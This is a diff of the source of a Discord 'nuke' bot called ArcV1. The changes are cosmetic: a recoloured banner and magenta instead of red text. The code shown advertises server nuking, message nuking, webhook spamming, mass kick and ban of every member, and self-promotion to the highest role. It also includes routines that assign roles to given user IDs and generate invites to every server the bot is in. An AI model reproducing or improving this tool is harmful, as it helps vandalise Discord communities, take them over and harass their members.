@@ -60,38 +60,40 @@ async def on_ready():
     os.system('cls' if os.name == 'nt' else 'clear')
 
     while True:
-        print(Fore.RED + "$$\    $$\  $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\  ")
-        print(Fore.RED + "\\$$\\  $$  |$$  __$$\ $$  __$$\ $$  _____|$$  __$$\ ")
-        print(Fore.RED + " \\$$\\$$  / $$$$$$$$ |$$ |  \\__|\\$$$$$$\\  $$$$$$$$ |")
-        print(Fore.RED + "  \\$$$  /  $$   ____|$$ |       \\____$$\\ $$   ____|")
-        print(Fore.RED + "   \\$  /   \\$$$$$$$\\ $$ |      $$$$$$$  |\\$$$$$$$\\ ")
-        print(Fore.RED + "    \\_/     \\_______|\\__|      \\_______/  \\_______|")
-        print(Fore.RED + "                                                        ")
-        print(Fore.RED + "                                                        ")
-        print(Fore.RED + "                                                        ")
+        print(Fore.MAGENTA + "                                                 ")
+        print(Fore.MAGENTA + "                                                 ")
+        print(Fore.MAGENTA + " /$$    /$$ /$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$ ")
+        print(Fore.MAGENTA + "|  $$  /$$//$$__  $$ /$$__  $$ /$$_____/ /$$__  $$")
+        print(Fore.MAGENTA + " \\  $$/$$/| $$$$$$$$| $$  \\__/|  $$$$$$ | $$$$$$$$")
+        print(Fore.MAGENTA + "  \\  $$$/ | $$_____/| $$       \\____  $$| $$_____/")
+        print(Fore.MAGENTA + "   \\  $/  |  $$$$$$$| $$       /$$$$$$$/|  $$$$$$$")
+        print(Fore.MAGENTA + "    \\_/    \\_______/|__/      |_______/  \\_______/")
+        print(Fore.MAGENTA + "                                                 ")
+        print(Fore.MAGENTA + "                                                 ")
+        print(Fore.MAGENTA + "                                                 ")
         print(
-            Fore.RED +
+            Fore.MAGENTA +
             " 1. ServerID nuke         2. Message Nuke        3. Webhook Spammer"
         )
         print(" ")
         print(
-            Fore.RED +
+            Fore.MAGENTA +
             " 4. Commands              5. Servers             6. Change Bot Token"
         )
         print(" ")
-        print(Fore.RED + " 7. Gen server invite     8. Unban User")
+        print(Fore.MAGENTA + " 7. Gen server invite     8. Unban User")
         print(" ")
 
-        choice = await async_input(Fore.RED + "user@ArcV1/~  ")
+        choice = await async_input(Fore.MAGENTA + "user@ArcV1/~  ")
 
         os.system('cls' if os.name == 'nt' else 'clear')
 
         if choice == '1':
-            server_id = await async_input(Fore.RED + "user@ArcV1/ServerID~ ")
+            server_id = await async_input(Fore.MAGENTA + "user@ArcV1/ServerID~ ")
             guild = bot.get_guild(int(server_id))
             if guild is None:
                 print(
-                    Fore.RED +
+                    Fore.MAGENTA +
 "[-] I cannot find a server with that ID (or the bot is not in it)"
                 )
             else:
@@ -102,7 +104,7 @@ async def on_ready():
 
                 bot_member = guild.get_member(bot.user.id)
                 if bot_member is None:
-                    print(Fore.RED + "[-] Could not find the bot in the server.")
+                    print(Fore.MAGENTA + "[-] Could not find the bot in the server.")
                     return
 
                 bot_highest_role = bot_member.top_role
@@ -111,7 +113,7 @@ async def on_ready():
                     role for role in guild.roles if role < bot_highest_role
                 ]
                 if not assignable_roles:
-                    print(Fore.RED +
+                    print(Fore.MAGENTA +
                           "[-] There are no roles that the bot can assign.")
                     return
 
@@ -123,7 +125,7 @@ async def on_ready():
 
                     if user is None:
                         print(
-                            Fore.RED +
+                            Fore.MAGENTA +
                             f"[-] User  with ID {user_id} not found in the server."
                         )
                     else:
@@ -136,12 +138,12 @@ async def on_ready():
                             )
                         except discord.Forbidden:
                             print(
-                                Fore.RED +
+                                Fore.MAGENTA +
                                 f"[-] I do not have permission to add roles to user with ID {user_id}."
                             )
                         except discord.HTTPException as e:
                             print(
-                                Fore.RED +
+                                Fore.MAGENTA +
                                 f"[-] Failed to add role to user with ID {user_id}: {e}"
                             )
 
@@ -183,31 +185,31 @@ async def on_ready():
             os.system('cls' if os.name == 'nt' else 'clear')
         elif choice == '4':
 
-            print(Fore.RED + "Available commands:")
-            print(Fore.RED + "$nuke - Nukes the server")
-            print(Fore.RED + "$kick - kicks every member (it can)")
-            print(Fore.RED + "$ban - bans every member (it can)")
-            print(Fore.RED + "$admin - gives you the highest role (it can)")
-            print(Fore.RED + "$create - creates a channel (example: $create chat")
-            print(Fore.RED + "$members - shows all members")
-            print(Fore.RED + "$perms - show the permissions it has")
+            print(Fore.MAGENTA + "Available commands:")
+            print(Fore.MAGENTA + "$nuke - Nukes the server")
+            print(Fore.MAGENTA + "$kick - kicks every member (it can)")
+            print(Fore.MAGENTA + "$ban - bans every member (it can)")
+            print(Fore.MAGENTA + "$admin - gives you the highest role (it can)")
+            print(Fore.MAGENTA + "$create - creates a channel (example: $create chat")
+            print(Fore.MAGENTA + "$members - shows all members")
+            print(Fore.MAGENTA + "$perms - show the permissions it has")
             time.sleep(3.5901086)
             os.system('cls' if os.name == 'nt' else 'clear')
         elif choice == '5':
             os.system('cls' if os.name == 'nt' else 'clear')
-            print(Fore.RED + "Bot is in the following servers:")
+            print(Fore.MAGENTA + "Bot is in the following servers:")
             for guild in bot.guilds:
-                print(Fore.RED +
+                print(Fore.MAGENTA +
                       f"Server Name: {guild.name}, Server ID: {guild.id}")
             time.sleep(5)
             os.system('cls' if os.name == 'nt' else 'clear')
         elif choice == '6':
             os.system('cls' if os.name == 'nt' else 'clear')
-            new_token = await async_input(Fore.RED +
+            new_token = await async_input(Fore.MAGENTA +
                                           "Please enter the new bot token: ")
             with open("token.txt", "w") as f:
                 f.write(new_token)
-            print(Fore.RED + "[+] Bot token has been updated.")
+            print(Fore.MAGENTA + "[+] Bot token has been updated.")
             time.sleep(2)
             os.system('cls' if os.name == 'nt' else 'clear')
 
@@ -217,16 +219,16 @@ async def on_ready():
                     if guild.text_channels:
                         invite = await guild.text_channels[0].create_invite(
                             max_age=300)  
-                        print(Fore.RED +
+                        print(Fore.MAGENTA +
                               f'[+] Invite link for {guild.name}: {invite}')
                     else:
-                        print(Fore.RED +
+                        print(Fore.MAGENTA +
                               f'[-] No text channels found in {guild.name}.')
                     time.sleep(
                         1
                     ) 
             else:
-                print(Fore.RED + "[-] The bot is not in any guilds.")
+                print(Fore.MAGENTA + "[-] The bot is not in any guilds.")
             time.sleep(5)  
             os.system('cls' if os.name == 'nt' else 'clear')
         elif choice == '8':
@@ -260,7 +262,7 @@ async def on_ready():
                             print("[-] Please enter a valid guild ID.")
 
         else:
-            print(Fore.RED + "[-] Invalid choice.")
+            print(Fore.MAGENTA + "[-] Invalid choice.")
             time.sleep(2)
             os.system('cls' if os.name == 'nt' else 'clear')
 
@@ -442,14 +444,14 @@ async def discommunity(ctx):
 
 token_file = "token.txt"  
 if not os.path.exists(token_file):
-    print(Fore.RED + "Made with love by verse 💖 ")
+    print(Fore.MAGENTA + "Made with love by verse 💖 ")
     print(" ")
     print(" ")
     print(" ")
     print(" ")
     print(" ")
     print(" ")
-    token = input(Fore.RED + "Please enter your bot token: ")
+    token = input(Fore.MAGENTA + "Please enter your bot token: ")
     with open(token_file, "w") as f:
         f.write(token)
 else:
